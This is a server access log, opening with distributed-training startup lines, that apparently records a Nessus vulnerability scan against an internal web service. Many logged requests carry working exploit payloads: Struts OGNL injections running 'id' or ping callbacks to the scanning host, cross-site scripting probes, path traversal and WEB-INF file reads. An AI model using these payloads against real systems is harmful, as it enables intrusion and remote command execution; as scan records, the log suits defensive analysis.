[Gloo] Rank [Gloo] Rank 01 is connected to  is connected to 11 peer ranks.  peer ranks. Expected number of connected peer ranks is : Expected number of connected peer ranks is : 11

[Gloo] Rank 1 is connected to 1 peer ranks. Expected number of connected peer ranks is : 1
[Gloo] Rank 0 is connected to 1 peer ranks. Expected number of connected peer ranks is : 1
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[2026-05-28 01:07:11] INFO:     10.127.66.203:47354 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:11] INFO:     10.127.66.203:47366 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:11] INFO:     10.127.66.203:47376 - "GET /cmf/login HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47388 - "GET /clientaccesspolicy.xml HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47404 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:11] INFO:     10.127.66.203:47416 - "GET /Director HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47426 - "GET /DesktopDirector HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47430 - "GET /citrix/nfuse/default/login.asp?NFuse_LogoutId=&NFuse_MessageType=Error&NFuse_Message=<SCRIPT>alert('Ritchie')</SCRIPT>&ClientDetection=ON HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47436 - "GET /login HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47444 - "GET /vpn/ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47456 - "GET /client/ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47460 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47474 - "GET /ControllerWeb/ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47480 - "GET /vsmc.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47490 - "GET /app/ui/login.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47496 - "GET /ui/faces/Login.xhtml HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47500 - "GET /index.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47510 - "GET /login HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47516 - "GET /system.xml HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47526 - "GET /getxml HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47538 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:11] INFO:     10.127.66.203:47548 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:11] INFO:     10.127.66.203:47556 - "GET /login.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47570 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47584 - "GET /api/config/class/guis HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47592 - "GET /cwhp/CSMSDesktop/about.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47606 - "GET /CSCOnm/servlet/login/login.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47622 - "GET http%3A//10.127.128.85%3A31877/authentication/login/ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47636 - "GET /lang_pack/EN.js HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47640 - "GET /login.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47646 - "GET /CSCOnm/servlet/login/login.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47660 - "GET /about.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47666 - "GET /admin/login.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47678 - "GET /restconf HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47692 - "GET /login.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47702 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47714 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:11] INFO:     10.127.66.203:47730 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:11] INFO:     10.127.66.203:47744 - "GET /csamc52/webadmin?page=invalid&type=browser HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47748 - "GET /login.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47760 - "GET /admin/public/index.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:11] INFO:     10.127.66.203:47762 - "GET /%2BCSCOE%2B/logon.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:12] INFO:     10.127.66.203:47778 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:12] INFO:     10.127.66.203:47786 - "GET /nls/ApplicationProperties-en.json HTTP/1.1" 404 Not Found
[2026-05-28 01:07:12] INFO:     10.127.66.203:47800 - "GET /securecgi-bin/CSUserCGI.exe?ver HTTP/1.1" 404 Not Found
[2026-05-28 01:07:12] INFO:     10.127.66.203:47812 - "GET /securecgi-bin/CSUserCGI.exe?Init+0 HTTP/1.1" 404 Not Found
[2026-05-28 01:07:36] INFO:     10.127.66.203:38416 - "GET /changelog HTTP/1.1" 404 Not Found
[2026-05-28 01:07:36] INFO:     10.127.66.203:38426 - "GET /version HTTP/1.1" 404 Not Found
[2026-05-28 01:07:36] INFO:     10.127.66.203:38438 - "GET /version HTTP/1.1" 404 Not Found
[2026-05-28 01:07:36] INFO:     10.127.66.203:38442 - "GET /Login.aspx HTTP/1.1" 404 Not Found
[2026-05-28 01:07:36] INFO:     10.127.66.203:38448 - "GET /admin/ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:36] INFO:     10.127.66.203:38458 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:36] INFO:     10.127.66.203:38464 - "GET /cacti HTTP/1.1" 404 Not Found
[2026-05-28 01:07:36] INFO:     10.127.66.203:38476 - "GET /MM/ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:36] INFO:     10.127.66.203:38488 - "GET /%25NETHOOD%25/ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:36] INFO:     10.127.66.203:38500 - "GET /login.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38506 - "GET /nosuchfile-732897081-234516564.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38514 - "GET /self_upgrade.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38524 - "GET /webapps/login/index.html HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38536 - "GET /webct/about.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38542 - "GET /WS2020/Default.aspx HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38546 - "GET /WS2021/Default.aspx HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38552 - "GET /WS2022/Default.aspx HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38560 - "GET /WS2023/Default.aspx HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38564 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:37] INFO:     10.127.66.203:38576 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:37] INFO:     10.127.66.203:38592 - "GET /login HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38608 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38622 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38626 - "GET /header.php HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38632 - "GET /.htaccess.old HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38644 - "GET /.htaccess.bak HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38652 - "GET /.htaccess~ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38660 - "GET /.htaccess.copy HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38666 - "GET /.htaccess.tmp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38674 - "GET /..htaccess.swp HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38686 - "GET /.htaccess.1 HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38694 - "GET /.htaccess.~1~ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38700 - "GET /login HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38710 - "GET /cgi-bin/kvm.cgi?&file=login HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38712 - "GET /login HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38718 - "GET /snmx-cgi/fxm.exe HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38720 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:37] INFO:     10.127.66.203:38720 - "GET /api/hpe-restapi.json HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38734 - "GET /jscripts/app.js HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38736 - "GET /web/%23/login HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38746 - "GET /platform-ui/ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38760 - "GET /management/ HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38764 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:07:37] INFO:     10.127.66.203:38770 - "GET /arcgis/rest/info?f=json HTTP/1.1" 404 Not Found
[2026-05-28 01:07:37] INFO:     10.127.66.203:38772 - "GET /server-info HTTP/1.1" 404 Not Found
[2026-05-28 01:08:48] INFO:     10.127.66.203:52170 - "GET /index.html HTTP/1.1" 404 Not Found
[2026-05-28 01:08:48] INFO:     10.127.66.203:52186 - "GET /login/ HTTP/1.1" 404 Not Found
[2026-05-28 01:08:48] INFO:     10.127.66.203:52202 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:08:48] INFO:     10.127.66.203:52208 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:08:48] INFO:     10.127.66.203:52218 - "GET /roller-ui/login.rol HTTP/1.1" 404 Not Found
[2026-05-28 01:08:48] INFO:     10.127.66.203:52226 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:08:48] INFO:     10.127.66.203:52242 - "GET /pluto/portal/ HTTP/1.1" 404 Not Found
[2026-05-28 01:08:48] INFO:     10.127.66.203:52252 - "GET /nifi/ HTTP/1.1" 404 Not Found
[2026-05-28 01:09:08] INFO:     10.127.66.203:42874 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:09:19] INFO:     10.127.66.203:40540 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:11:20] INFO:     10.127.66.203:39794 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:11:25] INFO:     10.127.66.203:44804 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:12:14] INFO:     10.127.66.203:56516 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:12:22] INFO:     10.127.66.203:56518 - "GET /kylin/api/admin/version HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56526 - "GET /translations/en.json HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56538 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:12:22] INFO:     10.127.66.203:56540 - "GET /unified-console.html HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56554 - "GET /login/ HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56562 - "GET /admin/airflow/login HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56572 - "GET /api/v1/?format=api HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56578 - "GET /api/v1/?format=api HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56594 - "GET /%23login HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56600 - "GET /libs/granite/core/content/login.html HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56612 - "GET /system/login HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56626 - "GET /system/login HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56628 - "GET usaherds/Logon.aspx HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56632 - "GET /courier/web/1000%40/wmLogin.html HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56634 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:12:22] INFO:     10.127.66.203:56636 - "GET /servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&service= HTTP/1.0" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56652 - "GET /chassis/config/GeneralChassisConfig.html HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56664 - "GET /this_page_should_not_exist.htm HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56676 - "GET /qwe/qwe/index.html HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56682 - "GET /favicon2.iso HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56690 - "GET /favicon.iso HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56706 - "GET /info HTTP/1.1" 404 Not Found
[2026-05-28 01:12:22] INFO:     10.127.66.203:56716 - "GET /play HTTP/1.1" 404 Not Found
[2026-05-28 01:12:28] INFO:     10.127.66.203:60830 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:13:15] INFO:     10.127.66.203:43278 - "GET %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%206275475038584c757a55%2010.127.66.203%27%29%29%7D// HTTP/1.1" 404 Not Found
[2026-05-28 01:13:30] INFO:     10.127.66.203:54614 - "GET %24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%206275475038584c757a55%2010.127.66.203%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D// HTTP/1.1" 404 Not Found
[2026-05-28 01:13:45] INFO:     10.127.66.203:46222 - "GET %24%7B%7B57550614%2B16044095%7D%7D// HTTP/1.1" 404 Not Found
[2026-05-28 01:14:06] INFO:     10.127.66.203:59064 - "POST / HTTP/1.1" 405 Method Not Allowed
[2026-05-28 01:15:37] INFO:     10.127.66.203:43308 - "GET //%28%23mem%3D%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29%3F%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%3Aindex.xhtml?cmd=ping%20%2dc%203%20%2dp%20733439614679506e6646%2010.127.66.203 HTTP/1.1" 404 Not Found
[2026-05-28 01:15:46] INFO:     10.127.66.203:45852 - "GET /?tag=tenable-214182074&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close HTTP/1.1" 200 OK
[2026-05-28 01:15:51] INFO:     10.127.66.203:45854 - "GET /?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'id'})).start()} HTTP/1.1" 200 OK
[2026-05-28 01:15:51] INFO:     10.127.66.203:45854 - "GET /?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23webroot%3d%23req.getSession().getServletContext().getRealPath('/'),%23resp%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23resp.print('At%201779902087%20Nessus%20found%20the%20path%20is%20'),%23resp.println(%23webroot),%23resp.flush(),%23resp.close()} HTTP/1.1" 200 OK
[2026-05-28 01:15:51] INFO:     10.127.66.203:45870 - "GET /?redirect:$%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p63703954546153574939%2010.127.66.203%27%29.getInputStream%28%29%29%7d HTTP/1.1" 200 OK
[2026-05-28 01:15:56] INFO:     10.127.66.203:51716 - "GET /?redirect:%24%7B57550614%2b16044095%7D HTTP/1.1" 200 OK
[2026-05-28 01:16:16] INFO:     10.127.66.203:54880 - "GET //%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3D%21%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%2C%28%40java.lang.Runtime%40getRuntime%28%29%29.exec%28%27id%27%29.waitFor%28%29%7D.action HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54896 - "POST /flex2gateway/http HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54900 - "POST /messagebroker/http HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54904 - "POST /blazeds/messagebroker/http HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54910 - "POST /lcds/messagebroker/http HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54914 - "GET /Websense/cgi-bin/WsCgiLogin.exe?Page=login&UserName=nessus%22%3e%3cscript%3ealert%28%27websense_username_xss.nasl%27%29%3c%2fscript%3e HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54916 - "GET /webhost HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54918 - "GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54928 - "GET /console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54934 - "GET /?"><script>alert('struts_sa_surl_xss.nasl-1779902112')</script> HTTP/1.1" 200 OK
[2026-05-28 01:16:16] INFO:     10.127.66.203:54940 - "GET /LoginPage.do HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54946 - "GET /home.jsf?autoScroll=0%2c275%29%3b%2f%2f--%3e%3c%2fscript%3e%3cscript%3ealert%28%27myfaces_tomahawk_autoscroll_xss.nasl%27 HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54958 - "GET /index.aspx HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54962 - "GET /Default.aspx HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54964 - "GET /item.fts?href=%22%3E%3Cscript%3Ealert%28%22ftgate_44002.nasl%22%29%3C%2Fscript%3E%3B HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54970 - "GET /login?user=**%3Cscript%3EJavaScript:alert('cpanel_login_user_xss.nasl')%3B%3C%2Fscript%3E HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54986 - "GET /admin/statistics/ConfigureStatistics HTTP/1.1" 404 Not Found
[2026-05-28 01:16:16] INFO:     10.127.66.203:54992 - "GET /altercast/AlterCast?op=%3cscript%3ealert%28%22adobe_document_server_61.nasl%22%29%3c%2fscript%3e HTTP/1.1" 404 Not Found
[2026-05-28 01:16:17] INFO:     10.127.66.203:55002 - "GET /nul.dbm HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55018 - "GET /s/cfx/_/%3B/WEB-INF/web.xml HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55034 - "GET /s/cfx/_/%3B/WEB-INF/classes/seraph-config.xml HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55042 - "GET /s/cfx/_/%3B/WEB-INF/decorators.xml HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55048 - "GET /s/cfx/_/%3B/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55052 - "GET /s/cfx/_/%3B/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55058 - "GET /s/cfx/_/%3B/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55062 - "GET /s/cfx/_/%3B/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55076 - "GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55092 - "GET /index.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55094 - "GET /index.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55096 - "GET /web.config HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55102 - "GET /scripts/w3who.dll HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55118 - "GET /cgi-bin/filescan HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55128 - "GET /struts/webconsole.html HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55142 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:16:18] INFO:     10.127.66.203:55142 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:16:18] INFO:     10.127.66.203:55144 - "POST / HTTP/1.1" 405 Method Not Allowed
[2026-05-28 01:16:18] INFO:     10.127.66.203:55146 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:16:18] INFO:     10.127.66.203:55146 - "GET /?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1779902114 HTTP/1.1" 200 OK
[2026-05-28 01:16:18] INFO:     10.127.66.203:55160 - "GET //%24%7B1941293119%2B5%7D.action HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55160 - "GET //%24%7B%23w%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23w.print%28%27Nessus%20Response%3A%20%27%29%2C%23w.println%28%27struts_2_3_14_3_command_execution-1941293119%27%29%2C%23w.flush%28%29%2C%23w.close%28%29%7D.action HTTP/1.1" 404 Not Found
[2026-05-28 01:16:18] INFO:     10.127.66.203:55170 - "GET //struts/webconsole.html HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56450 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:16:43] INFO:     10.127.66.203:56454 - "GET /.anydomain.test HTTP/1.0" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56458 - "GET /etc/mnt_info.csv HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56470 - "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56476 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:16:43] INFO:     10.127.66.203:56476 - "GET / HTTP/1.1" 200 OK
